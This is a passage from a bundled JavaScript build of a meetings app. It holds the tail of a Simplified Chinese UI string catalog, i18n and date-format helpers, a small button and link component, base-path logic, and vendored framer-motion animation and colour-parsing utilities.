项待复核\",\"statArchived\":\"已归档\",\"statFiled\":\"已提交\",\"statPending\":\"待处理\",\"title\":\"行动项复核\",\"unarchive\":\"恢复\"},\"session\":{\"agentToggleFailed\":\"无法更改该代理。\",\"agentsResumed\":\"代理已恢复运行。\",\"anotherMeetingActive\":\"已有另一场会议正在进行，请先结束它。\",\"anotherMeetingActiveNamed\":\"“{{title}}”仍在进行。请在会议中打开它，先选择“结束并复核”。\",\"anotherMeetingReviewing\":\"“{{title}}”仍在复核中。请在会议中打开它，先选择“关闭会议”。\",\"attachmentFailed\":\"无法更新附件。\",\"broadcastFailed\":\"无法联系到代理。\",\"broadcastSent\":\"已发送给正在聆听的代理。\",\"ended\":\"会议已结束。\",\"messageFailed\":\"无法发送该消息。\",\"minutesRevertFailed\":\"无法放弃你的修改。\",\"minutesSaveFailed\":\"无法保存你的修改。\",\"noteImageFailed\":\"无法添加该图片。请粘贴 PNG、JPEG、GIF 或 WebP。\",\"noteImageTooLarge\":\"该图片太大，无法添加到笔记中。\",\"noteSaveFailed\":\"无法保存你的笔记。\",\"openVoiceSettings\":\"打开语音设置\",\"renameFailed\":\"无法重命名会议。\",\"startFailed\":\"无法开始会议。\",\"started\":\"会议已开始。\",\"statusFailed\":\"无法更改会议状态。\",\"stopFailed\":\"无法结束会议。\",\"sttConnectionFailed\":\"无法连接到语音转写。\",\"sttDisconnected\":\"语音转写已断开。\",\"sttDispatchFailed\":\"无法将一段转录内容发送给智能体。\",\"sttMicDenied\":\"麦克风访问被拒绝。\",\"sttStreamingDisabled\":\"实时转写已关闭。请在 设置 → 语音 中确认已启用语音输入、所选提供方支持流式传输，并已开启流式传输。\",\"sttUnavailable\":\"语音转写不可用。\",\"sttUnsupported\":\"此浏览器无法录制音频。\",\"sttWorkletFailed\":\"无法启动音频处理器。\",\"taskAddFailed\":\"无法添加该行动项。\",\"taskFileFailed\":\"无法提交该行动项。\",\"taskFiled\":\"行动项已提交。\",\"untitled\":\"未命名会议\"},\"settings\":{\"addTerm\":\"添加\",\"agentsHelp\":\"会议提供哪些代理，以及其中哪些默认启用。\",\"agentsTitle\":\"代理\",\"aliasesLabel\":\"听错的形式\",\"aliasesPlaceholder\":\"转写听到的内容，用逗号分隔……\",\"back\":\"返回\",\"calendarHelp\":\"从哪里读取即将到来的会议。\",\"calendarProviderLabel\":\"日历提供方\",\"calendarSourceHint\":\"本地 .ics 文件的路径，或指向该文件的 https 链接。\",\"calendarSourceLabel\":\"日历来源\",\"calendarSourcePlaceholder\":\".ics 文件的路径或链接……\",\"calendarTitle\":\"日历\",\"correctLabel\":\"正确的术语\",\"correctPlaceholder\":\"应该写成什么……\",\"dictionaryHelp\":\"把反复出现的转写错误纠正一次，之后每场会议都能写对。\",\"dictionaryTitle\":\"语音词典\",\"enabledByDefault\":\"默认启用 {{name}}\",\"noTerms\":\"还没有纠正条目\",\"noTermsHint\":\"在左侧填写转写听错的内容，在右侧填写应该写成什么。\",\"removeTerm\":\"移除 {{term}}\",\"saveFailed\":\"无法保存设置。\",\"saveSource\":\"保存\",\"saved\":\"已保存。\",\"subtitle\":\"提供方、代理与语音词典\",\"taskProviderHelp\":\"复核后的行动项提交到哪里。\",\"taskProviderTitle\":\"任务提供方\",\"termFailed\":\"无法添加该纠正条目。\",\"termIncomplete\":\"请填写听到的内容和应该写成什么。\",\"title\":\"会议设置\",\"translationHelp\":\"将每句发言翻译成另一种语言，并在会议期间显示在侧边栏中。每句会消耗一次模型调用，因此默认关闭。\",\"translationOff\":\"关闭\",\"translationTitle\":\"实时翻译\"},\"taskSidebar\":{\"add\":\"添加\",\"assigneeLabel\":\"负责人\",\"close\":\"关闭行动项\",\"deleteTask\":\"删除此行动项\",\"descriptionLabel\":\"行动项\",\"empty\":\"还没有提取到任何内容。\",\"filed\":\"已提交\",\"heading_other\":\"{{count}} 个行动项\",\"priorityLabel\":\"优先级\",\"quickAddPlaceholder\":\"添加行动项……\",\"title\":\"行动项\",\"unassigned\":\"未指派\"},\"transcript\":{\"empty\":\"暂无转录\",\"emptyHintLive\":\"随着会议进行，最终确认的语音内容会显示在这里。\",\"emptyHintPaused\":\"已暂停 — 继续后语音将显示在这里。\",\"emptyHintRecorded\":\"这场会议没有记录转录。\",\"full\":\"转录已满。新的语音和广播将不再被记录或发送给代理。\",\"jumpToLatest\":\"跳到最新内容\",\"live\":\"实时\",\"regionLabel\":\"会议转录\",\"title\":\"转录\",\"typed\":\"文字输入\"},\"translation\":{\"close\":\"关闭翻译\",\"dropped\":\"为了跟上进度，已跳过部分内容。\",\"empty\":\"尚无翻译内容\",\"emptyHint\":\"发言时，译文会出现在这里。\",\"lineFailed\":\"无法翻译这一行。\",\"loading\":\"加载中…\",\"pending\":\"正在追赶…\",\"title\":\"翻译\"},\"widgetType\":{\"chat\":\"对话\",\"html\":\"图示\",\"markdown\":\"笔记\"}}}"),
		components: { "confirmDialog": { "cancel": "取消" } }
	}
};
var own = (obj, key) => Object.prototype.hasOwnProperty.call(obj, key);
function lookup(catalog, key) {
	let node = catalog;
	for (const part of key.split(".")) {
		if (node === void 0 || typeof node === "string" || !own(node, part)) return void 0;
		node = node[part];
	}
	return typeof node === "string" ? node : void 0;
}
/** The catalogs to try for `locale`, most specific first, always ending in English. */
function localeChain(locale) {
	const chain = [];
	const add = (candidate) => {
		if (own(CATALOGS, candidate) && !chain.includes(candidate)) chain.push(candidate);
	};
	add(locale);
	add(locale.split("-")[0]);
	add("en");
	return chain;
}
function currentLocale() {
	try {
		const locale = activeLocale();
		return typeof locale === "string" && locale ? locale : "en";
	} catch {
		return "en";
	}
}
var PLACEHOLDER = /\{\{\s*(\w+)\s*\}\}/g;
function pluralForm(locale, count) {
	try {
		return new Intl.PluralRules(locale).select(count);
	} catch {
		return count === 1 ? "one" : "other";
	}
}
function t(key, vars) {
	if (typeof key !== "string" || key === "") return "";
	const count = vars && typeof vars.count === "number" ? vars.count : void 0;
	for (const locale of localeChain(currentLocale())) {
		const catalog = CATALOGS[locale];
		let text;
		if (count !== void 0) text = lookup(catalog, `${key}_${pluralForm(locale, count)}`) ?? lookup(catalog, `${key}_other`);
		text = text ?? lookup(catalog, key);
		if (text !== void 0) return text.replace(PLACEHOLDER, (whole, name) => vars && own(vars, name) ? String(vars[name]) : whole);
	}
	return key;
}
/** The dashboard's name for this helper, so the ported call sites read unchanged. */
var i18nT = t;
// src/host/format.ts
/**
* The two date helpers the page used from the dashboard's `i18n/format.ts`.
*
* `fmtTime` is the SDK's own. `fmtDateFields` (a date built from explicit
* components rather than a style preset) is not in the SDK, so it is restated
* over the host's active locale: `Intl.DateTimeFormat` with the given fields.
*/
function toDate(value) {
	if (value === null || value === void 0 || value === "") return null;
	const d = value instanceof Date ? value : new Date(value);
	return Number.isNaN(d.getTime()) ? null : d;
}
function fmtDateFields(value, options) {
	const d = toDate(value);
	if (!d) return "—";
	let locale = "en";
	try {
		locale = activeLocale() || "en";
	} catch {}
	return new Intl.DateTimeFormat(locale, {
		localeMatcher: "lookup",
		...options
	}).format(d);
}
// src/host/ui.tsx
/**
* The dashboard's `components/ui` primitives this page uses.
*
* Every one but `IconButton` is the SDK's own. `IconButton` (a small square icon
* button whose `variant` sets the hover colour) is not in the SDK, so it is
* restated with the dashboard's classes; the dashboard's hover tip for a button
* with no `title` is left out, and every use here passes a `title`.
*/
var ICON_BUTTON_VARIANTS = {
	default: "text-muted hover:text-text hover:bg-bg-hover",
	accent: "text-muted hover:text-accent hover:bg-bg-hover",
	danger: "text-muted hover:text-danger-text hover:bg-danger-subtle",
	active: "text-accent hover:bg-bg-hover"
};
var IconButton = forwardRef(({ variant = "default", className = "", children, ...rest }, ref) => /* @__PURE__ */ jsx("button", {
	ref,
	type: "button",
	className: `p-[4px] rounded transition-all active:scale-[0.97] active:duration-75 cursor-pointer bg-transparent border-none disabled:opacity-30 disabled:cursor-not-allowed ${ICON_BUTTON_VARIANTS[variant]} ${className}`,
	...rest,
	children
}));
IconButton.displayName = "IconButton";
// src/host/basePath.ts
/**
* The dashboard's URL base, read at run time from where the gateway served this
* bundle.
*
* The dashboard knows its base from its own build (`KIROCREW_BASE_PATH`); an app
* bundle is built once for every install, so it derives the base instead: the
* gateway serves the bundle at `<base>/apps/meetings/ui/dist/index.mjs`, so the
* base is whatever precedes `/apps/meetings/` in the bundle's own URL. In the
* stock dashboard that is `''` and {@link withBase} is the identity.
*/
var APP_MOUNT = "/apps/meetings/";
function basePathOf(bundleUrl) {
	let pathname;
	try {
		pathname = new URL(bundleUrl).pathname;
	} catch {
		return "";
	}
	const at = pathname.indexOf(APP_MOUNT);
	return at > 0 ? pathname.slice(0, at).replace(/\/+$/, "") : "";
}
var BASE_PATH = basePathOf(import.meta.url);
/**
* Prefix a root-relative path (`/vendor/x.js`) with the base. Anything else
* (relative, protocol-relative, absolute URL) and a path already under the base
* is returned unchanged.
*/
function withBase(path, base = BASE_PATH) {
	if (base === "" || !path.startsWith("/") || path.startsWith("//")) return path;
	const end = path.search(/[?#]/);
	const pathname = end === -1 ? path : path.slice(0, end);
	return pathname === base || pathname.startsWith(`${base}/`) ? path : `${base}${path}`;
}
// src/host/Link.tsx
function Link({ to, className, children }) {
	const navigate = useNavigate();
	const onClick = (e) => {
		if (e.defaultPrevented || e.button !== 0 || e.metaKey || e.ctrlKey || e.shiftKey || e.altKey) return;
		e.preventDefault();
		navigate(to);
	};
	return /* @__PURE__ */ jsx("a", {
		href: withBase(to),
		className,
		onClick,
		children
	});
}
// node_modules/framer-motion/dist/es/context/LayoutGroupContext.mjs
var LayoutGroupContext = createContext({});
// node_modules/framer-motion/dist/es/utils/use-constant.mjs
/**
* Creates a constant value over the lifecycle of a component.
*
* Even if `useMemo` is provided an empty array as its final argument, it doesn't offer
* a guarantee that it won't re-run for performance reasons later on. By using `useConstant`
* you can ensure that initialisers don't execute twice or more.
*/
function useConstant(init) {
	const ref = useRef(null);
	if (ref.current === null) ref.current = init();
	return ref.current;
}
// node_modules/framer-motion/dist/es/utils/use-isomorphic-effect.mjs
var useIsomorphicLayoutEffect = typeof window !== "undefined" ? useLayoutEffect : useEffect;
// node_modules/framer-motion/dist/es/context/PresenceContext.mjs
/**
* @public
*/
var PresenceContext = /* @__PURE__ */ createContext(null);
// node_modules/motion-utils/dist/es/array.mjs
function addUniqueItem(arr, item) {
	if (arr.indexOf(item) === -1) arr.push(item);
}
function removeItem(arr, item) {
	const index = arr.indexOf(item);
	if (index > -1) arr.splice(index, 1);
}
// node_modules/motion-utils/dist/es/clamp.mjs
var clamp = (min, max, v) => {
	if (v > max) return max;
	if (v < min) return min;
	return v;
};
// node_modules/motion-utils/dist/es/global-config.mjs
var MotionGlobalConfig = {};
// node_modules/motion-utils/dist/es/is-numerical-string.mjs
/**
* Check if value is a numerical string, ie a string that is purely a number eg "100" or "-100.1"
*/
var isNumericalString = (v) => /^-?(?:\d+(?:\.\d+)?|\.\d+)$/u.test(v);
// node_modules/motion-utils/dist/es/is-object.mjs
var isObject = (value) => typeof value === "object" && value !== null;
// node_modules/motion-utils/dist/es/is-zero-value-string.mjs
/**
* Check if the value is a zero value string like "0px" or "0%"
*/
var isZeroValueString = (v) => /^0[^.\s]+$/u.test(v);
// node_modules/motion-utils/dist/es/memo.mjs
/*#__NO_SIDE_EFFECTS__*/
function memo(callback) {
	let result;
	return () => {
		if (result === void 0) result = callback();
		return result;
	};
}
// node_modules/motion-utils/dist/es/noop.mjs
var noop = /* @__NO_SIDE_EFFECTS__ */ (any) => any;
// node_modules/motion-utils/dist/es/pipe.mjs
/**
* Pipe
* Compose other transformers to run linearily
* pipe(min(20), max(40))
* @param  {...functions} transformers
* @return {function}
*/
var pipe = (...transformers) => transformers.reduce((a, b) => (v) => b(a(v)));
// node_modules/motion-utils/dist/es/progress.mjs
var progress = /* @__NO_SIDE_EFFECTS__ */ (from, to, value) => {
	const range = to - from;
	return range ? (value - from) / range : 1;
};
// node_modules/motion-utils/dist/es/subscription-manager.mjs
var SubscriptionManager = class {
	constructor() {
		this.subscriptions = [];
	}
	add(handler) {
		addUniqueItem(this.subscriptions, handler);
		return () => removeItem(this.subscriptions, handler);
	}
	notify(a, b, c) {
		const numSubscriptions = this.subscriptions.length;
		if (!numSubscriptions) return;
		if (numSubscriptions === 1)
 /**
		* If there's only a single handler we can just call it without invoking a loop.
		*/
		this.subscriptions[0](a, b, c);
		else for (let i = 0; i < numSubscriptions; i++) {
			/**
			* Check whether the handler exists before firing as it's possible
			* the subscriptions were modified during this loop running.
			*/
			const handler = this.subscriptions[i];
			handler && handler(a, b, c);
		}
	}
	getSize() {
		return this.subscriptions.length;
	}
	clear() {
		this.subscriptions.length = 0;
	}
};
// node_modules/motion-utils/dist/es/time-conversion.mjs
/**
* Converts seconds to milliseconds
*
* @param seconds - Time in seconds.
* @return milliseconds - Converted time in milliseconds.
*/
var secondsToMilliseconds = /* @__NO_SIDE_EFFECTS__ */ (seconds) => seconds * 1e3;
var millisecondsToSeconds = /* @__NO_SIDE_EFFECTS__ */ (milliseconds) => milliseconds / 1e3;
// node_modules/motion-utils/dist/es/velocity-per-second.mjs
var velocityPerSecond = /* @__NO_SIDE_EFFECTS__ */ (velocity, frameDuration) => frameDuration ? velocity * (1e3 / frameDuration) : 0;
// node_modules/motion-utils/dist/es/easing/cubic-bezier.mjs
var calcBezier = (t, a1, a2) => (((1 - 3 * a2 + 3 * a1) * t + (3 * a2 - 6 * a1)) * t + 3 * a1) * t;
var subdivisionPrecision = 1e-7;
var subdivisionMaxIterations = 12;
function binarySubdivide(x, lowerBound, upperBound, mX1, mX2) {
	let currentX;
	let currentT;
	let i = 0;
	do {
		currentT = lowerBound + (upperBound - lowerBound) / 2;
		currentX = calcBezier(currentT, mX1, mX2) - x;
		if (currentX > 0) upperBound = currentT;
		else lowerBound = currentT;
	} while (Math.abs(currentX) > subdivisionPrecision && ++i < subdivisionMaxIterations);
	return currentT;
}
/*#__NO_SIDE_EFFECTS__*/
function cubicBezier(mX1, mY1, mX2, mY2) {
	if (mX1 === mY1 && mX2 === mY2) return noop;
	const getTForX = (aX) => binarySubdivide(aX, 0, 1, mX1, mX2);
	return (t) => t === 0 || t === 1 ? t : calcBezier(getTForX(t), mY1, mY2);
}
// node_modules/motion-utils/dist/es/easing/modifiers/mirror.mjs
var mirrorEasing = /* @__NO_SIDE_EFFECTS__ */ (easing) => (p) => p <= .5 ? easing(2 * p) / 2 : (2 - easing(2 * (1 - p))) / 2;
// node_modules/motion-utils/dist/es/easing/modifiers/reverse.mjs
var reverseEasing = /* @__NO_SIDE_EFFECTS__ */ (easing) => (p) => 1 - easing(1 - p);
// node_modules/motion-utils/dist/es/easing/back.mjs
var backOut = /*@__PURE__*/ cubicBezier(.33, 1.53, .69, .99);
var backIn = /*@__PURE__*/ reverseEasing(backOut);
var backInOut = /*@__PURE__*/ mirrorEasing(backIn);
// node_modules/motion-utils/dist/es/easing/anticipate.mjs
var anticipate = (p) => p >= 1 ? 1 : (p *= 2) < 1 ? .5 * backIn(p) : .5 * (2 - Math.pow(2, -10 * (p - 1)));
// node_modules/motion-utils/dist/es/easing/circ.mjs
var circIn = (p) => 1 - Math.sin(Math.acos(p));
var circOut = /* @__PURE__ */ reverseEasing(circIn);
var circInOut = /* @__PURE__ */ mirrorEasing(circIn);
// node_modules/motion-utils/dist/es/easing/ease.mjs
var easeIn = /*@__PURE__*/ cubicBezier(.42, 0, 1, 1);
var easeOut = /*@__PURE__*/ cubicBezier(0, 0, .58, 1);
var easeInOut = /*@__PURE__*/ cubicBezier(.42, 0, .58, 1);
// node_modules/motion-utils/dist/es/easing/utils/is-easing-array.mjs
var isEasingArray = /* @__NO_SIDE_EFFECTS__ */ (ease) => {
	return Array.isArray(ease) && typeof ease[0] !== "number";
};
// node_modules/motion-utils/dist/es/easing/utils/is-bezier-definition.mjs
var isBezierDefinition = /* @__NO_SIDE_EFFECTS__ */ (easing) => Array.isArray(easing) && typeof easing[0] === "number";
// node_modules/motion-utils/dist/es/easing/utils/map.mjs
var easingLookup = {
	linear: noop,
	easeIn,
	easeInOut,
	easeOut,
	circIn,
	circInOut,
	circOut,
	backIn,
	backInOut,
	backOut,
	anticipate
};
var isValidEasing = (easing) => {
	return typeof easing === "string";
};
var easingDefinitionToFunction = (definition) => {
	if (/* @__PURE__ */ isBezierDefinition(definition)) {
		definition.length;
		const [x1, y1, x2, y2] = definition;
		return /* @__PURE__ */ cubicBezier(x1, y1, x2, y2);
	} else if (isValidEasing(definition)) {
		easingLookup[definition], `${definition}`;
		return easingLookup[definition];
	}
	return definition;
};
// node_modules/motion-dom/dist/es/frameloop/order.mjs
var stepsOrder = [
	"setup",
	"read",
	"resolveKeyframes",
	"preUpdate",
	"update",
	"preRender",
	"render",
	"postRender"
];
// node_modules/motion-dom/dist/es/frameloop/render-step.mjs
function createRenderStep(runNextFrame) {
	/**
	* We create and reuse two queues, one to queue jobs for the current frame
	* and one for the next. We reuse to avoid triggering GC after x frames.
	*/
	let thisFrame = /* @__PURE__ */ new Set();
	let nextFrame = /* @__PURE__ */ new Set();
	/**
	* Track whether we're currently processing jobs in this step. This way
	* we can decide whether to schedule new jobs for this frame or next.
	*/
	let isProcessing = false;
	let flushNextFrame = false;
	/**
	* A set of processes which were marked keepAlive when scheduled.
	*/
	const toKeepAlive = /* @__PURE__ */ new WeakSet();
	let latestFrameData = {
		delta: 0,
		timestamp: 0,
		isProcessing: false
	};
	function triggerCallback(callback) {
		if (toKeepAlive.has(callback)) {
			step.schedule(callback);
			runNextFrame();
		}
		callback(latestFrameData);
	}
	const step = {
		/**
		* Schedule a process to run on the next frame.
		*/
		schedule: (callback, keepAlive = false, immediate = false) => {
			const queue = immediate && isProcessing ? thisFrame : nextFrame;
			if (keepAlive) toKeepAlive.add(callback);
			queue.add(callback);
			return callback;
		},
		/**
		* Cancel the provided callback from running on the next frame.
		*/
		cancel: (callback) => {
			nextFrame.delete(callback);
			toKeepAlive.delete(callback);
		},
		/**
		* Execute all schedule callbacks.
		*/
		process: (frameData) => {
			latestFrameData = frameData;
			/**
			* If we're already processing we've probably been triggered by a flushSync
			* inside an existing process. Instead of executing, mark flushNextFrame
			* as true and ensure we flush the following frame at the end of this one.
			*/
			if (isProcessing) {
				flushNextFrame = true;
				return;
			}
			isProcessing = true;
			const prevFrame = thisFrame;
			thisFrame = nextFrame;
			nextFrame = prevFrame;
			thisFrame.forEach(triggerCallback);
			thisFrame.clear();
			isProcessing = false;
			if (flushNextFrame) {
				flushNextFrame = false;
				step.process(frameData);
			}
		}
	};
	return step;
}
// node_modules/motion-dom/dist/es/frameloop/batcher.mjs
var maxElapsed = 40;
function createRenderBatcher(scheduleNextBatch, allowKeepAlive) {
	let runNextFrame = false;
	let useDefaultElapsed = true;
	const state = {
		delta: 0,
		timestamp: 0,
		isProcessing: false
	};
	const flagRunNextFrame = () => runNextFrame = true;
	const steps = stepsOrder.reduce((acc, key) => {
		acc[key] = createRenderStep(flagRunNextFrame);
		return acc;
	}, {});
	const { setup, read, resolveKeyframes, preUpdate, update, preRender, render, postRender } = steps;
	const processBatch = () => {
		const useManualTiming = MotionGlobalConfig.useManualTiming;
		const timestamp = useManualTiming ? state.timestamp : performance.now();
		runNextFrame = false;
		if (!useManualTiming) state.delta = useDefaultElapsed ? 1e3 / 60 : Math.max(Math.min(timestamp - state.timestamp, maxElapsed), 1);
		state.timestamp = timestamp;
		state.isProcessing = true;
		setup.process(state);
		read.process(state);
		resolveKeyframes.process(state);
		preUpdate.process(state);
		update.process(state);
		preRender.process(state);
		render.process(state);
		postRender.process(state);
		state.isProcessing = false;
		if (runNextFrame && allowKeepAlive) {
			useDefaultElapsed = false;
			scheduleNextBatch(processBatch);
		}
	};
	const wake = () => {
		runNextFrame = true;
		useDefaultElapsed = true;
		if (!state.isProcessing) scheduleNextBatch(processBatch);
	};
	const schedule = stepsOrder.reduce((acc, key) => {
		const step = steps[key];
		acc[key] = (process, keepAlive = false, immediate = false) => {
			if (!runNextFrame) wake();
			return step.schedule(process, keepAlive, immediate);
		};
		return acc;
	}, {});
	const cancel = (process) => {
		for (let i = 0; i < stepsOrder.length; i++) steps[stepsOrder[i]].cancel(process);
	};
	return {
		schedule,
		cancel,
		state,
		steps
	};
}
// node_modules/motion-dom/dist/es/frameloop/frame.mjs
var { schedule: frame, cancel: cancelFrame, state: frameData, steps: frameSteps } = /* @__PURE__ */ createRenderBatcher(typeof requestAnimationFrame !== "undefined" ? requestAnimationFrame : noop, true);
// node_modules/motion-dom/dist/es/frameloop/sync-time.mjs
var now;
function clearTime() {
	now = void 0;
}
/**
* An eventloop-synchronous alternative to performance.now().
*
* Ensures that time measurements remain consistent within a synchronous context.
* Usually calling performance.now() twice within the same synchronous context
* will return different values which isn't useful for animations when we're usually
* trying to sync animations to the same frame.
*/
var time = {
	now: () => {
		if (now === void 0) time.set(frameData.isProcessing || MotionGlobalConfig.useManualTiming ? frameData.timestamp : performance.now());
		return now;
	},
	set: (newTime) => {
		now = newTime;
		queueMicrotask(clearTime);
	}
};
// node_modules/motion-dom/dist/es/animation/utils/is-css-variable.mjs
var checkStringStartsWith = (token) => (key) => typeof key === "string" && key.startsWith(token);
var isCSSVariableName = /*@__PURE__*/ checkStringStartsWith("--");
var startsAsVariableToken = /*@__PURE__*/ checkStringStartsWith("var(--");
var isCSSVariableToken = (value) => {
	if (!startsAsVariableToken(value)) return false;
	return singleCssVariableRegex.test(value.split("/*")[0].trim());
};
var singleCssVariableRegex = /var\(--(?:[\w-]+\s*|[\w-]+\s*,(?:\s*[^)(\s]|\s*\((?:[^)(]|\([^)(]*\))*\))+\s*)\)$/iu;
/**
* Check if a value contains a CSS variable anywhere (e.g. inside calc()).
* Unlike isCSSVariableToken which checks if the value IS a var() token,
* this checks if the value CONTAINS var() somewhere in the string.
*/
function containsCSSVariable(value) {
	if (typeof value !== "string") return false;
	return value.split("/*")[0].includes("var(--");
}
// node_modules/motion-dom/dist/es/value/types/numbers/index.mjs
var number = {
	test: (v) => typeof v === "number",
	parse: parseFloat,
	transform: (v) => v
};
var alpha = {
	...number,
	transform: (v) => clamp(0, 1, v)
};
var scale = {
	...number,
	default: 1
};
// node_modules/motion-dom/dist/es/value/types/utils/sanitize.mjs
var sanitize = (v) => Math.round(v * 1e5) / 1e5;
// node_modules/motion-dom/dist/es/value/types/utils/float-regex.mjs
var floatRegex = /-?(?:\d+(?:\.\d+)?|\.\d+)/gu;
// node_modules/motion-dom/dist/es/value/types/utils/is-nullish.mjs
function isNullish(v) {
	return v == null;
}
// node_modules/motion-dom/dist/es/value/types/utils/single-color-regex.mjs
var singleColorRegex = /^(?:#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\))$/iu;
// node_modules/motion-dom/dist/es/value/types/color/utils.mjs
/**
* Returns true if the provided string is a color, ie rgba(0,0,0,0) or #000,
* but false if a number or multiple colors
*/
var isColorString = (type, testProp) => (v) => {
	return Boolean(typeof v === "string" && singleColorRegex.test(v) && v.startsWith(type) || testProp && !isNullish(v) && Object.prototype.hasOwnProperty.call(v, testProp));
};
var splitColor = (aName, bName, cName) => (v) => {
	if (typeof v !== "string") return v;
	const [a, b, c, alpha] = v.match(floatRegex);
	return {
		[aName]: parseFloat(a),
		[bName]: parseFloat(b),
		[cName]: parseFloat(c),
		alpha: alpha !== void 0 ? parseFloat(alpha) : 1
	};
};
// node_modules/motion-dom/dist/es/value/types/color/rgba.mjs
var clampRgbUnit = (v) => clamp(0, 255, v);
var rgbUnit = {
	...number,
	transform: (v) => Math.round(clampRgbUnit(v))
};
var rgba = {
	test: /*@__PURE__*/ isColorString("rgb", "red"),
	parse: /*@__PURE__*/ splitColor("red", "green", "blue"),
	transform: ({ red, green, blue, alpha: alpha$1 = 1 }) => "rgba(" + rgbUnit.transform(red) + ", " + rgbUnit.transform(green) + ", " + rgbUnit.transform(blue) + ", " + sanitize(alpha.transform(alpha$1)) + ")"
};
// node_modules/motion-dom/dist/es/value/types/color/hex.mjs
function parseHex(v) {
	let r = "";
	let g = "";
	let b = "";
	let a = "";
	if (v.length > 5) {
		r = v.substring(1, 3);
		g = v.substring(3, 5);
		b = v.substring(5, 7);
		a = v.substring(7, 9);
	} else {
		r = v.substring(1, 2);
		g = v.substring(2, 3);
		b = v.substring(3, 4);
		a = v.substring(4, 5);
		r += r;
		g += g;
		b += b;
		a += a;
	}
	return {
		red: parseInt(r, 16),
		green: parseInt(g, 16),
		blue: parseInt(b, 16),
		alpha: a ? parseInt(a, 16) / 255 : 1
	};
}
var hex = {
	test: /*@__PURE__*/ isColorString("#"),
	parse: parseHex,
	transform: rgba.transform
};
// node_modules/motion-dom/dist/es/value/types/numbers/units.mjs
var createUnitType = /* @__NO_SIDE_EFFECTS__ */ (unit) => ({
	test: (v) => typeof v === "string" && v.endsWith(unit) && v.split(" ").length === 1,
	parse: parseFloat,
	transform: (v) => `${v}${unit}`
});
var degrees = /*@__PURE__*/ createUnitType("deg");
var percent = /*@__PURE__*/ createUnitType("%");
var px = /*@__PURE__*/ createUnitType("px");
var vh = /*@__PURE__*/ createUnitType("vh");
var vw = /*@__PURE__*/ createUnitType("vw");
var progressPercentage = /*@__PURE__*/ (() => ({
	...percent,
	parse: (v) => percent.parse(v) / 100,
	transform: (v) => percent.transform(v * 100)
}))();
// node_modules/motion-dom/dist/es/value/types/color/hsla.mjs
var hsla = {
	test: /*@__PURE__*/ isColorString("hsl", "hue"),
	parse: /*@__PURE__*/ splitColor("hue", "saturation", "lightness"),
	transform: ({ hue, saturation, lightness, alpha: alpha$1 = 1 }) => {
		return "hsla(" + Math.round(hue) + ", " + percent.transform(sanitize(saturation)) + ", " + percent.transform(sanitize(lightness)) + ", " + sanitize(alpha.transform(alpha$1)) + ")";
	}
};
// node_modules/motion-dom/dist/es/value/types/color/index.mjs
var color = {
	test: (v) => rgba.test(v) || hex.test(v) || hsla.test(v),
	parse: (v) => {
		if (rgba.test(v)) return rgba.parse(v);
		else if (hsla.test(v)) return hsla.parse(v);
		else return hex.parse(v);
	},
	transform: (v) => {
		return typeof v === "string" ? v : v.hasOwnProperty("red") ? rgba.transform(v) : hsla.transform(v);
	},
	getAnimatableNone: (v) => {
		const parsed = color.parse(v);
		parsed.alpha = 0;
		return color.transform(parsed);
	}
};
// node_modules/motion-dom/dist/es/value/types/utils/color-regex.mjs
var colorRegex = /(?:#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\))/giu;
// node_modules/motion-dom/dist/es/value/types/complex/index.mjs
function test(v) {
	return isNaN(v) && typeof v === "string" && (v.match(floatRegex)?.length || 0) + (v.match(colorRegex)?.length || 0) > 0;
}
var NUMBER_TOKEN = "number";
var COLOR_TOKEN = "color";
var VAR_TOKEN = "var";
var VAR_FUNCTION_TOKEN = "var(";
var SPLIT_TOKEN = "${}";
var complexRegex = /var\s*\(\s*--(?:[\w-]+\s*|[\w-]+\s*,(?:\s*[^)(\s]|\s*\((?:[^)(]|\([^)(]*\))*\))+\s*)\)|#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\)|-?(?:\d+(?:\.\d+)?|\.\d+)/giu;
function analyseComplexValue(value) {
	const originalValue = value.toString();
	const values = [];
	const indexes = {
		color: [],
		number: [],
		var: []
	};
	const types = [];
	let i = 0;
	return {
		values,
		split: originalValue.replace(complexRegex, (parsedValue) => {
			if (color.test(parsedValue)) {
				indexes.color.push(i);
				types.push(COLOR_TOKEN);
				values.push(color.parse(parsedValue));
			} else if (parsedValue.startsWith(VAR_FUNCTION_TOKEN)) {
				indexes.var.push(i);
				types.push(VAR_TOKEN);
				values.push(parsedValue);
			} else {
				indexes.number.push(i);
				types.push(NUMBER_TOKEN);
				values.push(parseFloat(parsedValue));
			}
			++i;
			return SPLIT_TOKEN;
		}).split(SPLIT_TOKEN),
		indexes,
		types
	};
}
function parseComplexValue(v) {
	return analyseComplexValue(v).values;
}
function buildTransformer({ split, types }) {
	const numSections = split.length;
	return (v) => {
		let output = "";
		for (let i = 0; i < numSections; i++) {
			output += split[i];
			if (v[i] !== void 0) {
				const type = types[i];
				if (type === NUMBER_TOKEN) output += sanitize(v[i]);
				else if (type === COLOR_TOKEN) output += color.transform(v[i]);
				else output += v[i];
			}
		}
		return output;
	};
}
function createTransformer(source) {
	return buildTransformer(analyseComplexValue(source));
}
var convertNumbersToZero = (v) => typeof v === "number" ? 0 : color.test(v) ? color.getAnimatableNone(v) : v;
/**
* Convert a parsed value to its zero equivalent, but preserve numbers
* that act as divisors in CSS calc() expressions.
*
* analyseComplexValue extracts numbers from CSS strings and puts the
* surrounding text into a `split` template array. For example:
*   "calc(var(--gap) / 5)"  →  values: [var(--gap), 5]
*                               split:  ["calc(", " / ", ")"]
*
* When building a zero-equivalent for animation, naively zeroing all
* numbers turns the divisor into 0 → "calc(var(--gap) / 0)" → NaN.
* We detect this by checking whether the text preceding a number
* (split[i]) ends with "/" — the CSS calc division operator.
*/
var convertToZero = (value, splitBefore) => {
	if (typeof value === "number") return splitBefore?.trim().endsWith("/") ? value : 0;
	return convertNumbersToZero(value);
};
function getAnimatableNone$1(v) {
	const info = analyseComplexValue(v);
	return buildTransformer(info)(info.values.map((value, i) => convertToZero(value, info.split[i])));
}
var complex = {
	test,
	parse: parseComplexValue,
	createTransformer,
